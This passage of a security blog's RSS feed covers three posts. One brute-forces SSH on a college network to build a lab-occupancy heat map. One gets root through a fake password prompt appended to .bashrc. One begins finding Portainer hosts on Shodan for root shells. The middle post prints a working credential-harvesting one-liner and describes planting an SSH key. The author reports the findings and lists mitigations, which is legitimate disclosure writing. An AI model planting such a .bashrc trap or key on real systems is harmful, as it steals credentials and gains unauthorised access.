	height=&#34;998&#34;
	srcset=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/ssh_port_scan_hu1143654086383212746.png 480w, http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/ssh_port_scan_hu2323178954725116190.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;SSH Port Scan on Private Network&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;100&#34;
		data-flex-basis=&#34;242px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;brute-forcing-ssh-servers&#34;&gt;Brute Forcing SSH Servers
&lt;/h2&gt;&lt;p&gt;The next task was to identify the servers where we could authenticate using our Computer Center credentials.&lt;br /&gt;
To accomplish this, I used the tool &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/SSH-Brute-Force.git&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Gill-Singh-A/SSH-Brute-Force&lt;/a&gt;&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/ssh_brute_force.png&#34;
	width=&#34;747&#34;
	height=&#34;241&#34;
	srcset=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/ssh_brute_force_hu11087886100348921863.png 480w, http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/ssh_brute_force_hu14075750169346195069.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;SSH Brute Force&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;309&#34;
		data-flex-basis=&#34;743px&#34;
	
&gt;&lt;br /&gt;
After getting the Results, I got some interesting results.&lt;/p&gt;
&lt;h2 id=&#34;linux-lab-ips&#34;&gt;Linux Lab IPs
&lt;/h2&gt;&lt;p&gt;I discovered 110 consecutive IP addresses, and upon gathering more information, I learned that these belonged to the Computer Center&amp;rsquo;s Linux Lab 2 and 3.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/linux_lab_pc.png&#34;
	width=&#34;786&#34;
	height=&#34;943&#34;
	srcset=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/linux_lab_pc_hu8919633338099758210.png 480w, http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/linux_lab_pc_hu12534562684825068655.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Linux Lab PC SSH&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;83&#34;
		data-flex-basis=&#34;200px&#34;
	
&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&#34;users-currently-loggedin-the-computer&#34;&gt;Users currently logged in the Computer
&lt;/h2&gt;&lt;p&gt;After that, I accessed the computer using my user ID via SSH. &lt;br /&gt;
To check the currently logged-in users, I entered the command &lt;strong&gt;who&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/who.png&#34;
	width=&#34;415&#34;
	height=&#34;82&#34;
	srcset=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/who_hu12145478836246524794.png 480w, http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/who_hu13584290742720563728.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Users Currently Logged In&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;506&#34;
		data-flex-basis=&#34;1214px&#34;
	
&gt;&lt;br /&gt;
This command allowed me to see both users logged in through SSH (indicated by their IP addresses) and those who were logged in offline (identified by the DISPLAY index, which starts with &lt;em&gt;:&lt;/em&gt;) with their login time.&lt;/p&gt;
&lt;h2 id=&#34;building-the-heat-map&#34;&gt;Building the Heat Map
&lt;/h2&gt;&lt;p&gt;After identifying the users on specific computers in Computer Center Linux Lab 2 and 3, it was time to create the heat map.&lt;br /&gt;
I compiled a CSV file containing the IP addresses and locations of the computers, then developed a Python program to automate the process of checking user activity on each machine and display the results.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/heat_map_cli.png&#34;
	width=&#34;963&#34;
	height=&#34;361&#34;
	srcset=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/heat_map_cli_hu12093248892090213383.png 480w, http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/heat_map_cli_hu15377235950789636050.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Heat Map Program&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;266&#34;
		data-flex-basis=&#34;640px&#34;
	
&gt;&lt;br /&gt;
The program presents the results on the user&amp;rsquo;s &lt;a class=&#34;link&#34; href=&#34;https://home.iitk.ac.in&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;IITK Homepage&lt;/a&gt; that was used in the program.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/heat_map_webhome.png&#34;
	width=&#34;1915&#34;
	height=&#34;948&#34;
	srcset=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/heat_map_webhome_hu8058897782699062672.png 480w, http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/heat_map_webhome_hu16937831630874459995.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Heat Map Web Page&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;202&#34;
		data-flex-basis=&#34;484px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;results&#34;&gt;Results
&lt;/h2&gt;&lt;p&gt;The Final Python Program used  to create the Heat Map for Linux Computer Labs at IIT Kanpur is &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/IITK-Heat-Map&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Gill-Singh-A/IITK-Heat-Map&lt;/a&gt;&lt;br /&gt;
It displays the results on &lt;a class=&#34;link&#34; href=&#34;https://home.iitk.ac.in/~amansg22/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;My Student Homepage&lt;/a&gt; for the following Labs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Computer Center Linux Labs&lt;/li&gt;
&lt;li&gt;NCL Linux Lab&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- --&gt;
&lt;p&gt;In my opinion, this tool is particularly useful for students during exams, as it helps save time by allowing them to see in advance if a computer lab is full before heading there.&lt;br /&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Using Social Engineering for Privilege Escalation</title>
        <link>http://localhost:1313/p/using-social-engineering-for-privilege-escalation/</link>
        <pubDate>Mon, 23 Sep 2024 05:28:07 +0530</pubDate>
        
        <guid>http://localhost:1313/p/using-social-engineering-for-privilege-escalation/</guid>
        <description>&lt;img src="http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt.png" alt="Featured image of post Using Social Engineering for Privilege Escalation" /&gt;&lt;h2 id=&#34;prologue&#34;&gt;Prologue
&lt;/h2&gt;&lt;p&gt;While exploring devices on my college network, I managed to gain Remote Desktop Access to a server for one of our institute&amp;rsquo;s websites. The method I used to obtain access to the interface is out of the scope of this blog.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/remote_desktop_interface.png&#34;
	width=&#34;1042&#34;
	height=&#34;779&#34;
	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/remote_desktop_interface_hu3798650764409171018.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/remote_desktop_interface_hu4295186151521413508.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Remote Desktop Access&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;133&#34;
		data-flex-basis=&#34;321px&#34;
	
&gt;&lt;br /&gt;
Upon gaining access, I found that the server was running &lt;strong&gt;Ubuntu&lt;/strong&gt;. The terminal displayed &lt;strong&gt;user&lt;/strong&gt; as the current user.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/current_user.png&#34;
	width=&#34;1038&#34;
	height=&#34;778&#34;
	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/current_user_hu18328591220318913029.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/current_user_hu7294103013318607692.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Terminal&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;133&#34;
		data-flex-basis=&#34;320px&#34;
	
&gt;&lt;br /&gt;
I added my public key to &lt;em&gt;/home/user/.ssh/authorized_keys&lt;/em&gt; and checked the SSH connection.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/user_ssh_connection.png&#34;
	width=&#34;715&#34;
	height=&#34;502&#34;
	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/user_ssh_connection_hu10281628265701383641.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/user_ssh_connection_hu7560144399843845447.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;User SSH Connection&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;142&#34;
		data-flex-basis=&#34;341px&#34;
	
&gt;&lt;br /&gt;
With SSH access confirmed, it was time to escalate our privileges to the &lt;em&gt;&lt;strong&gt;root&lt;/strong&gt;&lt;/em&gt; user.&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation
&lt;/h2&gt;&lt;p&gt;Initially, I explored various SUIDs, SGIDs, Cronjob Files, the Shadow File, shared libraries, and other system components to find potential vulnerabilities. &lt;br /&gt;
After finding no useful exploits, I downloaded and executed &lt;a class=&#34;link&#34; href=&#34;https://github.com/peass-ng/PEASS-ng&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;linPEAS&lt;/a&gt; to search for additional attack surfaces, but it was not successful.&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&#34;social-engineering&#34;&gt;Social Engineering
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;I&amp;rsquo;M GOOD AT READING PEOPLE. MY SECRET. I LOOK FOR THE WORST IN THEM.&amp;rdquo; - Mr.Robot&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!-- --&gt;
&lt;p&gt;This line from Mr. Robot inspired me after my initial methods for privilege escalation failed.&lt;br /&gt;
I devised a strategy to obtain the password for &lt;strong&gt;user&lt;/strong&gt; using a social engineering approach.&lt;br /&gt;
I created a single-line bash script to be appended to &lt;em&gt;/home/user/.bashrc&lt;/em&gt;.&lt;br /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s1&#34;&gt;&amp;#39;password for user: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; -s password&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 &amp;gt;/tmp/tmp.txt&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; grep -v &lt;span class=&#34;s1&#34;&gt;&amp;#39;random_signature&amp;#39;&lt;/span&gt; /home/user/.bashrc &amp;gt;/tmp/tmp&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; mv /tmp/tmp /home/user/.bashrc&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; chmod &lt;span class=&#34;m&#34;&gt;644&lt;/span&gt; ~/.bashrc&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s Understand this command-by-command&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Prints &lt;strong&gt;password for user:&lt;/strong&gt; on the screen, tricking the user into thinking it’s a prompt for their password.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s1&#34;&gt;&amp;#39;password for user: &amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Inputs the password in silent mode, so it doesn’t appear on the screen.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; -s password
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Encodes the password in &lt;strong&gt;base64&lt;/strong&gt; and saves it to &lt;em&gt;/tmp/tmp.txt&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 &amp;gt;/tmp/tmp.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Removes lines containing &lt;strong&gt;random_signature&lt;/strong&gt; from &lt;em&gt;/home/user/.bashrc&lt;/em&gt;, ensuring it doesn’t affect the file’s functionality.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;grep -v &lt;span class=&#34;s1&#34;&gt;&amp;#39;random_signature&amp;#39;&lt;/span&gt; /home/user/.bashrc &amp;gt;/tmp/tmp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Replaces the original &lt;strong&gt;.bashrc&lt;/strong&gt; file with the modified version.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mv /tmp/tmp /home/user/.bashrc
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Restores the original file permissions for &lt;strong&gt;.bashrc&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;644&lt;/span&gt; ~/.bashrc
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;After appending this line to &lt;em&gt;/home/user/.bashrc&lt;/em&gt;, every time a new terminal was opened, it would prompt the &lt;strong&gt;user&lt;/strong&gt; for their password.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt.png&#34;
	width=&#34;890&#34;
	height=&#34;390&#34;
	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt_hu9311836505811142885.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt_hu15260579389586501392.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Password Prompt&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;228&#34;
		data-flex-basis=&#34;547px&#34;
	
&gt;&lt;br /&gt;
Once the user entered their password, the line would be removed from &lt;strong&gt;.bashrc&lt;/strong&gt;, restoring the file to its original state. I could then SSH into the machine and retrieve the base64 encoded password from &lt;em&gt;/tmp/tmp.txt&lt;/em&gt;.&lt;br /&gt;
Although there were concerns about potential failures, such as entering the wrong password or pressing &lt;strong&gt;CTRL+C&lt;/strong&gt;, the method worked successfully after a few days.&lt;/p&gt;
&lt;h2 id=&#34;obtaining-password&#34;&gt;Obtaining Password
&lt;/h2&gt;&lt;p&gt;A few days later, I logged in as &lt;strong&gt;user&lt;/strong&gt; via SSH and found that it wasn’t prompting for a password. I checked &lt;em&gt;/tmp/tmp.txt&lt;/em&gt; and found the base64 encoded password.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_password.png&#34;
	width=&#34;610&#34;
	height=&#34;384&#34;
	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_password_hu15247351470866518167.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_password_hu12880556767352814779.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Base64 Encoded Password&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;158&#34;
		data-flex-basis=&#34;381px&#34;
	
&gt;&lt;br /&gt;
After Decoding it, I obtained the password.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_decoding.png&#34;
	width=&#34;568&#34;
	height=&#34;119&#34;
	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_decoding_hu4472420002180516116.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_decoding_hu1426856767055626827.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Base64 Decoding&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;477&#34;
		data-flex-basis=&#34;1145px&#34;
	
&gt;&lt;br /&gt;
Finally, I verified the success of my social engineering method by checking for root access.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/sudo_bash.png&#34;
	width=&#34;190&#34;
	height=&#34;40&#34;
	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/sudo_bash_hu15170616915056937535.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/sudo_bash_hu4895617423315236842.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Sudo Bash&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;475&#34;
		data-flex-basis=&#34;1140px&#34;
	
&gt;&lt;br /&gt;
There We have the &lt;strong&gt;root&lt;/strong&gt; user!&lt;/p&gt;
&lt;h2 id=&#34;reporting&#34;&gt;Reporting
&lt;/h2&gt;&lt;p&gt;As a responsible and ethical individual, I reported the findings to the concerned authorities. They have since addressed and fixed the issues discussed.&lt;/p&gt;
&lt;h2 id=&#34;mitigations&#34;&gt;Mitigations
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Social Engineering&lt;/strong&gt; remains one of the most dangerous methods of compromising security because it exploits human psychology rather than technical vulnerabilities. The weakest link in any security system is often the human element. Even the most secure systems can be breached if someone is tricked into revealing sensitive information or executing malicious commands.&lt;br /&gt;
To mitigate the risk of social engineering attacks:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Security Awareness Training&lt;/strong&gt;: Regularly train employees to recognize and respond to social engineering tactics.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Verification Procedures&lt;/strong&gt;: Implement strict verification processes for sensitive actions or information requests.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Multi-Factor Authentication (MFA)&lt;/strong&gt;: Use MFA to add an extra layer of security beyond just passwords.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Monitor and Audit&lt;/strong&gt;: Regularly monitor and audit access logs for suspicious activity.&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- --&gt;
&lt;p&gt;By addressing these areas, you can significantly reduce the risk posed by social engineering and other similar attacks.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Getting Remote Root Shell on Devices via Portainer</title>
        <link>http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/</link>
        <pubDate>Mon, 23 Sep 2024 05:21:38 +0530</pubDate>
        
        <guid>http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/</guid>
        <description>&lt;img src="http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/main_image.png" alt="Featured image of post Getting Remote Root Shell on Devices via Portainer" /&gt;&lt;h2 id=&#34;portainer&#34;&gt;Portainer
&lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.portainer.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Portainer&lt;/a&gt; is an open-source management tool designed for containers. It offers a user-friendly, lightweight web interface that simplifies the deployment and management of Docker environments. It&amp;rsquo;s important to note that while Portainer itself does not run with root privileges, if the Docker service managed by Portainer operates with root permissions, it could potentially lead to a remote root shell vulnerability, as discussed further.&lt;/p&gt;
&lt;h2 id=&#34;information-gathering&#34;&gt;Information Gathering
&lt;/h2&gt;&lt;h3 id=&#34;collecting-target-devices&#34;&gt;Collecting Target Devices
&lt;/h3&gt;&lt;p&gt;We&amp;rsquo;ll use &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Shodan Search Engine&lt;/a&gt; to Collect Target Devices.&lt;br /&gt;
On &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Shodan Search Engine&lt;/a&gt; search with query &lt;em&gt;product:portainer&lt;/em&gt;, this would list out all the Devices that were identified running Portainer by Shodan.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_search.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_search_hu5065758196418204342.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_search_hu3985421631415068294.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Shodan Search&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;
After setting the requeired filters, we can download the results.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_download_results.png&#34;
	width=&#34;715&#34;
	height=&#34;56&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_download_results_hu2063741215654517212.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_download_results_hu6580981014759218426.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Shodan Download Results&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1276&#34;
		data-flex-basis=&#34;3064px&#34;
	
&gt;&lt;br /&gt;
The Number of Results that can be downloaded depends upon your query credits available(1 Query Credit = 100 Results)&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_download_results_1.png&#34;
	width=&#34;1233&#34;
	height=&#34;487&#34;
	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_download_results_1_hu14804659552564800396.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/shodan_download_results_1_hu13959971194765878774.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Shodan Download Results&#34;
	
	
		class=&#34;gallery-image&#34; 
